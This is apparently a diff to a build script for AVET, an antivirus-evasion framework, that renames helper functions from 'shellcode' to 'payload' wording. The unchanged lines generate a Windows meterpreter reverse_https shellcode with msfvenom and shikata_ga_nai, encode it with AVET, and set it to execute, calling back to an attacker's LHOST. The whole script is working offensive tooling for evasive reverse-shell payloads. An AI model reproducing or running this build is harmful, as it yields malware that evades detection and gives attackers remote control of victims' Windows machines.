@@ -24,10 +24,10 @@ LHOST=$GLOBAL_LHOST
 msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -f c -a x86 --platform Windows > input/sc_c.txt
 
 # Apply AVET encoding via format.sh tool
-encode_shellcode avet input/sc_c.txt output/scenc_raw.txt
+encode_payload avet input/sc_c.txt output/scenc_raw.txt
 
 # set shellcode source
-set_shellcode_source dynamic_from_file
+set_payload_source dynamic_from_file
 
 # set decoder and key source
 # AVET decoder requires no key
@@ -35,7 +35,7 @@ set_decoder avet
 set_key_source none
 
 # set shellcode binding technique
-set_shellcode_binding exec_shellcode
+set_payload_execution_method exec_shellcode
 
 # enable debug output
 enable_debug_print
